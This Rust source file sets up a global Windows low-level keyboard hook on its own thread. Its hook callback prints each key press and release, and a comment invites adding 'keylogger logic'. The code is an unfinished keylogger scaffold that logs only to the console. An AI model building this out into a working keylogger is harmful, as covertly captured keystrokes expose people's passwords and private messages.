use  winapi::um::winuser::{CallNextHookEx, DefWindowProcW, GetMessageA, SetWindowsHookExW, HC_ACTION, HOOKPROC, KBDLLHOOKSTRUCT, MSG, VK_LSHIFT, VK_RSHIFT, WH_KEYBOARD_LL, WH_MOUSE_LL, WM_KEYDOWN, WM_KEYFIRST, WM_KEYUP};
use winapi::shared::minwindef::{HINSTANCE, WPARAM, LPARAM, LPVOID, HMODULE};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::shared::windef::{HHOOK, HWND__};
use winapi::ctypes::c_int;
use std::ptr;
use winsafe::GetLastError;
use winapi::um::winnt::HANDLE;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::winbase::INFINITE;

// extern "system" fn: This defines the function with the correct calling convention (stdcall) required for Windows API callbacks.
unsafe extern "system" fn hookfun(code: c_int, w_param: WPARAM, l_param: LPARAM) -> isize{
    
    let l_param_structure: KBDLLHOOKSTRUCT = *(l_param as *const KBDLLHOOKSTRUCT);
    //write a keylogger logic here in this if condition
    if code == HC_ACTION{
        if (l_param_structure.vkCode == VK_LSHIFT as u32) || (l_param_structure.vkCode == VK_RSHIFT as u32){


        }
        if w_param == WM_KEYDOWN as usize {
            println!("button pressed. {}", l_param_structure.vkCode);
            println!("{} {} {}", code, w_param, l_param);
        }
        if w_param == WM_KEYUP as usize {
            println!("button released.");
            println!("{} {} {}", code, w_param, l_param);
        }
        
    }   
      return  CallNextHookEx(std::ptr::null_mut(), code, w_param, l_param);
}

unsafe extern "system" fn logger(_lp_param: LPVOID) -> u32{
    
    println!("from thread");
    let ret: HHOOK;
        
    let h_instance: HMODULE = GetModuleHandleA(ptr::null_mut() );
    println!("Module Handle: {:?}", h_instance);
    
    ret = SetWindowsHookExW(WH_KEYBOARD_LL /*WH_MOUSE_LL*/, Some(hookfun), /*h_instance*/0 as HINSTANCE, 0);
 
    println!("{:?}", ret);
   
    let mut msg: MSG = unsafe { std::mem::zeroed() };
    let  msg_handle: *mut HWND__= std::ptr::null_mut();
    
    while GetMessageA(&mut msg, msg_handle, 0 , 0 as u32) != 0 {
        //println!("{}", msg.message);
        DefWindowProcW(msg.hwnd, msg.message, msg.wParam, msg.lParam);
    }
    
    return 1;
   
}


pub fn keylog(){
    unsafe {     
        let handle: HANDLE = CreateThread(ptr::null_mut(), 0, Some(logger), ptr::null_mut(), 0, ptr::null_mut());
        println!("Thread creation succeeded {} ", GetLastError());
        if handle.is_null() {
            println!("Failed to create thread");
        } else {
            // Wait for the thread to finish
            WaitForSingleObject(handle, INFINITE);
        }
    }
}